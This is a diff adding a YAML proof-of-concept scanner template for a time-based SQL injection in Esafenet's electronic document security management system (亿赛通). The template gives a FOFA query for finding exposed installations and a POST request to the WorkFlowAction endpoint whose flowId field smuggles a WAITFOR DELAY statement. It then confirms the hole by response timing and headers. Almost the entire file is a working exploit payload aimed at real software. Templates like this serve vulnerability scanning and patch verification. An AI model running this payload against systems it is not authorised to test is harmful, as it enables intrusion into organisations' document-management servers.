@@ -1,0 +1,21 @@
+id: poc-yaml-yisaitong-esafenet-workflowaction-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 WorkFlowAction SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 亿赛通电子文档安全管理系统
+  fofa: app="亿赛通-电子文档安全管理系统"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /CDGServer3/3g/WorkFlowAction;Servicelogin
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: command=Approval&userId=1&fromurl=getTodoList.jsp?curpage=111&flowId=111'%3bWAITFOR+DELAY+'0%3a0%3a{{.t1}}'--
+  expression: status_code == 302 && contains(headers,"Location\x3a index.jsp") &&
+    contains(headers,"Path=/CDGServer3") && body == "" && duration > t1 && duration
+    < t2
+transport: http
